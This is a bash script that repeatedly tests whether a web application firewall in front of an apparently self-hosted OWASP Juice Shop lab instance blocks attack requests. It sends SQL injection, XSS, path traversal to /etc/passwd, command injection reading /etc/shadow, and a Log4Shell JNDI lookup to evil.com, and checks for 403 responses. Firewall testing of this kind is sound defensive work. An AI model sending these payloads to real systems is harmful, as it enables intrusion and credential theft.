#!/bin/bash

TARGET="http://juice-shop-alb-1621080480.eu-central-1.elb.amazonaws.com"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}=== STARTING FINAL WAF TEST ON: $TARGET ===${NC}"
echo "Press CTRL+C to stop."
echo ""

while true; do
    echo -n "1. [SQLi]   Testing UNION SELECT... "
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/rest/products/search?q=q'%20UNION%20SELECT%201,2,3,4,5%20FROM%20Users--")
    if [ "$STATUS" == "403" ]; then echo -e "${RED}BLOCKED (403)${NC}"; else echo -e "${GREEN}PASSED ($STATUS)${NC}"; fi

    echo -n "2. [XSS]    Testing Script Tag...   "
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/rest/products/search?q=<script>alert('XSS')</script>")
    if [ "$STATUS" == "403" ]; then echo -e "${RED}BLOCKED (403)${NC}"; else echo -e "${GREEN}PASSED ($STATUS)${NC}"; fi

    echo -n "3. [LFI]    Testing /etc/passwd...  "
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/ftp/../../../../etc/passwd")
    if [ "$STATUS" == "403" ]; then echo -e "${RED}BLOCKED (403)${NC}"; else echo -e "${GREEN}PASSED ($STATUS)${NC}"; fi

    echo -n "4. [CMD]    Testing Command Inj...  "
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET/api/Feedbacks" \
        -H "Content-Type: application/json" \
        --data '{"comment":"; cat /etc/shadow;","rating":5}')
    if [ "$STATUS" == "403" ]; then echo -e "${RED}BLOCKED (403)${NC}"; else echo -e "${GREEN}PASSED ($STATUS)${NC}"; fi

    echo -n "5. [JNDI]   Testing Log4Shell...    "
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET" -H "User-Agent: \${jndi:ldap://evil.com/x}")
    if [ "$STATUS" == "403" ]; then echo -e "${RED}BLOCKED (403)${NC}"; else echo -e "${GREEN}PASSED ($STATUS)${NC}"; fi

    echo -n "6. [BOT]    Testing Bad UserAgent... "
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET" -H "User-Agent: sqlmap")
    if [ "$STATUS" == "403" ]; then echo -e "${RED}BLOCKED (403)${NC}"; else echo -e "${GREEN}PASSED ($STATUS)${NC}"; fi

    echo -n "7. [USER]   Testing Normal Visit... "
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET")
    if [ "$STATUS" == "200" ] || [ "$STATUS" == "304" ]; then echo -e "${GREEN}OK ($STATUS)${NC}"; else echo -e "${RED}ERROR ($STATUS)${NC}"; fi

    echo "----------------------------------------"
    sleep 1
done